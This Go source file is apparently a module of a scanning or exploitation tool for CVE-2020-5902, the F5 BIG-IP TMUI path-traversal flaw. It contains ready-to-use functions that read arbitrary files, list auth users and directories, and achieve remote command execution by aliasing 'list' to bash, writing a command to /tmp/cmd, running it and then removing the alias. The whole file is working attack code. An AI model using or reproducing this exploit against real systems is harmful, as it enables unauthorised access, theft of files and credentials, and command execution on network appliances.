package cve_2020_5902

import (
	"fmt"
	"github.com/fatih/color"
	"github.com/imroc/req/v3"
	"os"
	"strings"
)

var (
	urlBase string
)

func FileRead(urlInput, method, vul, filename string) {
	if strings.HasSuffix(urlInput, `/`) {
		urlInput = strings.TrimRight(urlInput, `/`)
	}
	urlBase = urlInput
	color.Green("[+] Start test vul: %s use method %s on target: %s; ", vul, method, urlBase)

	client := req.C()
	client.EnableForceHTTP1()
	client.EnableInsecureSkipVerify()

	urlIndex := fmt.Sprintf("%s/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=%s", urlBase, filename)
	resp, err := client.R().Get(urlIndex)
	if err != nil {
		color.Red("[-] Error: %s", err.Error())
		color.Red("[-] File read Error on %s", vul)
		os.Exit(0)
	}

	if resp.IsSuccess() {
		color.Green(strings.TrimLeft(resp.String(), "\n"), "\n")
		color.Green("[+] File read success on %s", urlBase)
	} else {
		color.Red("[-] File read failed on %s", urlBase)
	}
}

func UserList(urlInput, method, vul string) {
	if strings.HasSuffix(urlInput, `/`) {
		urlInput = strings.TrimRight(urlInput, `/`)
	}
	urlBase = urlInput
	color.Green("[+] Start test vul: %s use method %s on target: %s; ", vul, method, urlBase)

	client := req.C()
	client.EnableForceHTTP1()
	client.EnableInsecureSkipVerify()

	urlIndex := fmt.Sprintf("%s/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user", urlBase)
	resp, err := client.R().Get(urlIndex)
	if err != nil {
		color.Red("[-] Error: %s", err.Error())
		color.Red("[-] File read Error on %s", urlBase)
		os.Exit(0)
	}

	if resp.IsSuccess() {
		color.Green(strings.TrimLeft(resp.String(), "\n"), "\n")
		color.Green("[+] User list success on %s", urlBase)
	} else {
		color.Red("[-] User list Failed on %s", urlBase)
	}
}

func DirList(urlInput, method, vul, dirPath string) {
	if strings.HasSuffix(urlInput, `/`) {
		urlInput = strings.TrimRight(urlInput, `/`)
	}
	urlBase = urlInput
	color.Green("[+] Start test vul: %s use method %s on target: %s; ", vul, method, urlBase)

	client := req.C()
	client.EnableForceHTTP1()
	client.EnableInsecureSkipVerify()

	urlIndex := fmt.Sprintf("%s/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=%s", urlBase, dirPath)
	resp, err := client.R().Get(urlIndex)
	if err != nil {
		color.Red("[-] Error: %s", err.Error())
		color.Red("[-] Dir list Error on %s", urlBase)
		os.Exit(0)
	}

	if resp.IsSuccess() {
		color.Green(strings.TrimLeft(resp.String(), "\n"), "\n")
		color.Green("[+] Dir list success on %s", urlBase)
	} else {
		color.Red("[-] Dir list Failed on %s", urlBase)
	}
}

func Exploit(urlInput, vul, command string) {
	if strings.HasSuffix(urlInput, `/`) {
		urlInput = strings.TrimRight(urlInput, `/`)
	}
	urlBase = urlInput
	color.Green("[+] Start test vul: %s use method rce on target: %s", vul, urlBase)

	client := req.C()
	client.EnableForceHTTP1()
	client.EnableInsecureSkipVerify()
	urlIndex := fmt.Sprintf("%s/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp", urlBase)
	payloadCreate := "command=create cli alias private list command bash"
	respCreate, err := client.R().SetBody(payloadCreate).Post(urlIndex)
	if err != nil {
		color.Red("[-] Error: %s", err.Error())
		color.Red("[-] Eval command error on %s when create alias", urlBase)
		os.Exit(0)
	}
	if respCreate.IsSuccess() {
		color.Green("[+] Create alias success on %s", urlBase)
	}
	print(respCreate.String())

	urlIndex = fmt.Sprintf("%s/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=%s", urlBase, command)
	respWrite, err := client.R().Get(urlIndex)
	if err != nil {
		color.Red("[-] Error: %s", err.Error())
		color.Red("[-] Eval command %s write command %s", urlBase, command)
		os.Exit(0)
	}
	if respWrite.IsSuccess() {
		color.Green("[+] Write command success on %s", urlBase)
	}
	print(respWrite.String())

	urlIndex = fmt.Sprintf("%s/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp", urlBase)
	payloadEval := "command=list /tmp/cmd"
	resEval, err := client.R().SetBody(payloadEval).Post(urlIndex)
	if err != nil {
		color.Red("[-] Error: %s", err.Error())
		color.Red("[-] Eval command error on %s read response %s", urlBase)
		os.Exit(0)
	}

	if resEval.IsSuccess() {
		color.Green(strings.TrimLeft(resEval.String(), `\n`))
		color.Green("[+] Read response %s success on %s", command, urlBase)
	} else {
		color.Red("[-] Read response %s Failed on %s", command, urlBase)
	}

	urlIndex = fmt.Sprintf("%s/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp", urlBase)
	payloadRestore := "command=delete+cli+alias+private+list"
	respRestore, err := client.R().SetBody(payloadRestore).Post(urlIndex)
	if err != nil {
		color.Red("[-] Error: %s", err.Error())
		color.Red("[-] Restore env failed on %s", urlBase)
		os.Exit(0)
	}
	if respRestore.IsSuccess() {
		color.Green("[+] Restore env success on %s", urlBase)
	}

}
